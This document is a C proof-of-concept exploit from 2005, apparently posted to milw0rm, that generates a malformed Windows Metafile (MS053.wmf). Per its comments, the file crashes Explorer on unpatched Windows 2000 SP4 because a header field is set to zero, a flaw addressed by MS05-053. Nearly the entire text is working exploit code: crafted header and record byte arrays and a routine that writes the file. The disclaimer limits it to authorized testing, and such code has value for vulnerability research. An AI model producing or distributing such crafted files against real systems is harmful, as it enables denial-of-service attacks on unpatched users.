/*
 * Author: Winny Thomas
 *         Pune, INDIA
 *
 * The crafted metafile (WMF) from this code when viewed in explorer crashes it. The issue is seen
 * when the field 'mtNoObjects' in the Metafile header is set to 0x0000.
 * The code was tested on Windows 2000 server SP4. The issue does not occur with the  
 * hotfix for GDI (MS05-053) installed.
 *
 * Disclaimer: This code is for educational/testing purposes by authorized persons on 
 * networks/systems setup for such a purpose. The author of this code shall not bear 
 * any responsibility for any damage caused by using this code. 
 *
 */

#include <stdio.h>

unsigned char wmfheader[] = 
"\xd7\xcd\xc6\x9a\x00\x00\xc6\xfb\xca\x02\xaa\x02\x39\x09\xe8\x03"
"\x00\x00\x00\x00\x66\xa6"
"\x01\x00"	   //mtType	
"\x09\x00"	   //mtHeaderSize
"\x00\x03"	   //mtVersion
"\xff\xff\xff\x7f" //mtSize
"\x00\x00"	   //mtNoObjects 
"\xff\xff\xff\xff" //mtMaxRecord
"\x00\x00";

unsigned char metafileRECORD[] = 
"\x05\x00\x00\x00\x0b\x02\x39\x09\xc6\xfb\x05\x00\x00\x00\x0c\x02"
"\x91\xf9\xe4\x06\x04\x00\x00\x00\x06\x01\x01\x00\x07\x00\x00\x00"
"\xfc\x02\x00\x00\x0e\x0d\x0d\x00\x00\x00\x04\x00\x00\x00\x2d\x01"
"\x00\x00\x08\x00\x00\x00\xfa\x02"
"\x05\x00\x00\x00\x00\x00\xff\xff\xff\x00\x04\x00\x00\x00\x2d\x01"
"\x01\x00\x04\x00\x00\x00\x06\x01\x01\x00\x14\x00\x00\x00\x24\x03"
"\x08\x00\xc6\xfb\xca\x02\xbc\xfe\xca\x02\x0f\x01\x49\x06\xa5\x02"
"\x49\x06\xf4\x00\x68\x08\xd5\xfc\x65\x06\x86\xfe\x65\x06\xc6\xfb"
"\xca\x02\x08\x00\x00\x00\xfa\x02\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x04\x00\x00\x00\x2d\x01\x02\x00\x07\x00\x00\x00\xfc\x02"
"\x00\x00\xff\xff\xff\x00\x00\x00\x04\x00\x00\x00\x2d\x01\x03\x00"
"\x04\x00\x00\x00\xf0\x01\x00\x00\x07\x00\x00\x00\xfc\x02\x00\x00"
"\xbd\x34\x30\x00\x00\x00\x04\x00\x00\x00\x2d\x01\x00\x00\x04\x00"
"\x00\x00\x2d\x01\x01\x00\x04\x00\x00\x00\x06\x01\x01\x00\x0e\x00"
"\x00\x00\x24\x03\x05\x00\xd5\xfc\x36\x07\xda\xfc\xd1\x06\x8b\xfe"
"\xd1\x06\x86\xfe\x36\x07\xd5\xfc\x36\x07\x04\x00\x00\x00\x2d\x01"
"\x02\x00\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00\x00\x00\xf0\x01"
"\x00\x00\x07\x00\x00\x00\xfc\x02\x00\x00\xbd\x34\x30\x00\x00\x00"
"\x04\x00\x00\x00\x2d\x01\x00\x00\x04\x00\x00\x00\x2d\x01\x01\x00"
"\x04\x00\x00\x00\x06\x01\x01\x00\x0e\x00\x00\x00\x24\x03\x05\x00"
"\xc6\xfb\x9b\x03\xcb\xfb\x36\x03\xc1\xfe\x36\x03\xbc\xfe\x9b\x03"
"\xc6\xfb\x9b\x03\x04\x00\x00\x00\x2d\x01\x02\x00\x04\x00\x00\x00"
"\x2d\x01\x03\x00\x04\x00\x00\x00\xf0\x01\x00\x00\x07\x00\x00\x00"
"\xfc\x02\x00\x00\xfb\x4e\x55\x00\x00\x00\x04\x00\x00\x00\x2d\x01"
"\x00\x00\x04\x00\x00\x00\x2d\x01\x01\x00\x04\x00\x00\x00\x06\x01"
"\x01\x00\x0e\x00\x00\x00\x24\x03\x05\x00\xbc\xfe\x9b\x03\xc1\xfe"
"\x36\x03\x14\x01\xb5\x06\x0f\x01\x1a\x07\xbc\xfe\x9b\x03\x04\x00"
"\x00\x00\x2d\x01\x02\x00\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00"
"\x00\x00\xf0\x01\x00\x00\x07\x00\x00\x00\xfc\x02\x00\x00\xbd\x34"
"\x30\x00\x00\x00\x04\x00\x00\x00\x2d\x01\x00\x00\x04\x00\x00\x00"
"\x2d\x01\x01\x00\x04\x00\x00\x00\x06\x01\x01\x00\x0e\x00\x00\x00"
"\x24\x03\x05\x00\x0f\x01\x1a\x07\x14\x01\xb5\x06\xaa\x02\xb5\x06"
"\xa5\x02\x1a\x07\x0f\x01\x1a\x07\x04\x00\x00\x00\x2d\x01\x02\x00"
"\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00\x00\x00\xf0\x01\x00\x00"
"\x07\x00\x00\x00\xfc\x02\x00\x00\xfa\x94\x93\x00\x00\x00\x04\x00"
"\x00\x00\x2d\x01\x00\x00\x04\x00\x00\x00\x2d\x01\x01\x00\x04\x00"
"\x00\x00\x06\x01\x01\x00\x14\x00\x00\x00\x24\x03\x08\x00\xc6\xfb"
"\x9b\x03\xbc\xfe\x9b\x03\x0f\x01\x1a\x07\xa5\x02\x1a\x07\xf4\x00"
"\x39\x09\xd5\xfc\x36\x07\x86\xfe\x36\x07\xc6\xfb\x9b\x03\x04\x00"
"\x00\x00\x2d\x01\x02\x00\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00"
"\x00\x00\xf0\x01\x00\x00\x03\x00";

unsigned char wmfeof[] = 
"\x00\x00\x00\x00";

int main(int argc, char *argv[])
{
	FILE *fp;
	int metafilesizeW, recordsizeW;
	char wmfbuf[2048];
	int metafilesize, recordsize, i, j;
	
	metafilesize = sizeof (wmfheader) + sizeof (metafileRECORD) + sizeof(wmfeof) -3;
	metafilesizeW = metafilesize/2;
	recordsize = sizeof (metafileRECORD) -1;
	recordsizeW = recordsize/2;
	
	memcpy((unsigned long *)&wmfheader[28], &metafilesize, 4);
	memcpy((unsigned long *)&wmfheader[34], &recordsizeW, 4);

	printf("[*] Adding Metafile header\n");
	for (i = 0; i < sizeof(wmfheader) -1; i++) {
		(unsigned char)wmfbuf[i] = (unsigned char)wmfheader[i];
	}
			
	printf("[*] Adding metafile records\n");
	for (j = i, i = 0; i < sizeof(metafileRECORD) -1; i++, j++) {
		wmfbuf[j] = metafileRECORD[i];
	}
	
	printf("[*] Setting EOF\n");
	for (i = 0; i < sizeof(wmfeof) -1; i++, j++) {
		wmfbuf[j] = wmfeof[i];
	}

	printf("[*] Creating Metafile (MS053.wmf)\n");
	fp = fopen("MS053.wmf", "wb");
	fwrite(wmfbuf, 1, metafilesize, fp);
	fclose(fp);
}

// milw0rm.com [2005-11-30]